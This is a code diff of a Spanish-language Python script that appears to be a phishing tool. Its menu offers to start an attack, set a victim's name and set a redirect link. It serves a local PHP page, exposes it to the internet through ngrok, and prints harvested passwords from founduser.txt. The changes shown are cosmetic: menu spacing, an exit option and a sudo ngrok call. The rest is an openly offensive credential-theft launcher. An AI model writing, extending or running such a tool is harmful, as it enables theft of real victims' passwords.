@@ -26,7 +26,7 @@ def contra():
         clearConsole()
         logo()
         archiv= open('founduser.txt')
-        print('Contraseñas:')
+        print('Contraseñas:                Ctrl+c para salir')
         print(archiv.read())
 
 def link():
@@ -37,17 +37,18 @@ def link():
 
 def ngrok():
     os.system("gnome-terminal -- sudo php -S localhost:8080")
-    os.system("gnome-terminal -- ./ngrok http 8080")
+    os.system("gnome-terminal -- sudo ngrok http 8080")
     clearConsole()
     contra()
     print("Las contraseñas estaran almacenadas en founduser.txt")
 
 
 logo()
-y=int(input("""Bienvenido desea:
+y=int(input("""             Bienvenido desea:
 1- Iniciar ataque
 2- Ingresar nombre de la víctima
 3- Ingresar link para redireccionar
+4- Salir
 $=  """))
 
 if y==1:
@@ -60,3 +61,5 @@ elif y==2:
 elif y==3:
     link()
     clearConsole()
+elif y==4:
+    print("  HASTA PRONTO!!")
